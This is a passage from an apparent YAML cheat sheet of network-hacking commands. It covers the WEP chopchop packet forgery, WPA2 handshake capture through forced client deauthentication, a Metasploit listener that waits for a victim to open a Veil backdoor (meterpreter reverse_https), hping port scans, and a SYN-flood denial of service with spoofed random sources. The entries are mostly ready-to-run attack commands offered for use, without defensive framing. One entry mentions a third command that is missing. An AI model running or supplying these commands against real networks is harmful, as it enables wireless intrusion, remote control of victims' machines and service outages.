  description: Tries to determine the IV by the sent packets to forge a fake one and inject it into the target network to generate traffic
  type: command:
  content: >-
    The Chopchop attack works a little like the ARP replay attack, it will need to capture some packets
    to determine the IV so it can be used to forge a fake packet and that packet will be injected into
    the target network so we generate traffic in it to crack its WEP password.

    We specify `-0` in packetforge so we create a fake ARP packet and `-y` to specify the name of
    the keystream file generated by aireplay-ng, and then we inject that package with the third command.

    Take in account that you need to keep associating between commands so the target network doesn't
    ignore you.
  commands:
    - aireplay-ng --chopchop -b [NetworkBSSID] -h [InterfaceInMonitorModeMAC] [InterfaceInMonitorMode]
    - packetforge-ng -0 -a [NetworkBSSID] -h [InterfaceInMonitorModeMAC] -k [DestinationIP] -l [SourceIP] -y [KeystreamFile] -w [PacketName]

- title: Capturing the handshake of a WPA2 network
  category: NetworkHacking
  description: Gets the handshake of a WPA2 network
  type: command
  content: >-
    The handshake is a file that, doesn't contain the password - or something that lets us get it - of a WPA2 network as it was
    with WEP, but it's something that will help us determine if a password is correct or if it is wrong. The handshakes are
    necessary to performing bruteforce attacks.

    First, we have to sniff the packets of our target network, then we have to deauthenticate any connected client to the
    network (with 4 packets it'd be enough to get the handshake) and once the client connects back to the network, on the top
    right side of the airodump-ng output, you'll see "WPA Handshake", meaning the handshake was captured successfully.
  commands:
    - airodump-ng --bssid [NetworkBSSID] --channel [NetworkChannel] --write [OutputFile] [Interface]
    - aireplay-ng --deauth 4 -a [NetworkBSSID] -c [ClientBSSID] wlan0mon

- title: Veil Evasion - Listen for incoming connections
  category: DeviceHacking
  description: Listens for incoming connections
  type: command
  content: >-
    Once the victim opens the backdoor, we'll need to listen for an incoming
    connection in our computer. To do so, first open metasploit, load the
    mentioned exploit and the payload, port and host selected in veil.
  commands:
    - msfconsole
    - use exploit/multi/handler
    - set PAYLOAD [PayloadSpecifiedInVEIL]
    - set LHOST [LHOSTSetInVeil]
    - set LPORT [LPORTSetInVeil]
  example:
    - msfconsole
    - use exploit/multi/handler
    - set PAYLOAD windows/meterpreter/reverse_https
    - set LHOST 192.168.1.4
    - set LPORT 8080

- title: SYN scan with Hping
  category: NetworkHacking
  description: Scans a target and returns its open ports
  type: command
  content: >-
    We can perform an active scan using hping on a target to get its opened
    ports and the name of the service they are running.

    Running this command will perform a scan between min_port and max_port on
    [target ip/domain].

    The `-S` flag is used to perform a scan using the SYN flag.
  commands:
    - hping3 --scan [min_port]-[max_port] -S [target ip/domain]
  example:
    - hping3 --scan 0-500 -S 192.168.1.8

- title: Xmas scan with Hping
  category: NetworkHacking
  description: Scans a target and returns its open ports
  type: command
  content: >-
    Perform a Xman scan on a target.
  commands:
    - hping3 --scan [min_port]-[max_port] -X [target ip/domain]
  example:
    - hping3 --scan 0-500 -X 192.168.1.8

- title: DoS attack with Hping
  category: NetworkHacking
  description: Performs a DoS attack using Hping
  type: command
  content: >-
    Performs a DoS attack.

    The `--flood` flag sends packets as fast as possible, the `-S` flag means to
    send the packets using the SYN flag, `-V` means verbose and `--rand-source`
    will randomise the source IP addresses.
  commands:
    - hping3 --flood -S -V --rand-source [target ip/domain]
  example:
    - hping3 --flood -S -V --rand-source 192.168.1.8
